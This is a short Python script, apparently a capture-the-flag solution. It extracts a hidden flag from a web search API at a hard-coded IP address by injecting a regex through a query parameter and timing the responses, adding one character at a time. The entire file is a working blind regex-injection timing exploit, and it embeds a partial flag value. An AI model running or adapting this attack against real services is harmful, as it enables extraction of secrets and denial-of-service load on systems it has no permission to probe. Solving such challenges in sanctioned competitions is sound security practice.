import requests
import time

with open("regex", "rb") as f:
    regex = f.read().strip().lstrip()

charset = "_0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
def sice_regex(deet):
    assert len(deet) < 0x1fc0 
    sice = time.time()
    shit = requests.get("http://34.84.233.159:49670/api/search?channel=\"\"\"&q="+deet)
    sice2 = time.time()
    return shit.content, sice2-sice

current_flag = "Y0URETH3W1NNNER202O"

for each in charset:
    new_cur = current_flag + each
    new_cur = new_cur.ljust(20, '.')
    sice_deet = regex.replace("REPLACE_ME", new_cur)
    timeshit = sice_regex('"'+sice_deet+'"')[1]
    if timeshit > 0.05:
        print("{} -> {}".format(new_cur, timeshit))

